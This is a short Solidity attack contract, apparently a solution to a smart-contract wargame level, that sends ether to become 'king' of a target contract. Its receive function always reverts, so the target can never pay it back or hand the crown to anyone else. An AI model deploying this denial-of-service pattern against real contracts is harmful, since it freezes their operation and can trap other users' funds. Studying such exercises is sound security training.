// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract KingAttack {
  address immutable kingAddr;

  constructor(address _kingAddr) {
    kingAddr = _kingAddr;
  }

  function attack() external payable{
    (bool sent, bytes memory data) = kingAddr.call{value: msg.value}("");
    require(sent, "Failed to send Ether");
  }

  receive() external payable {
    revert("Forever King");
  }
}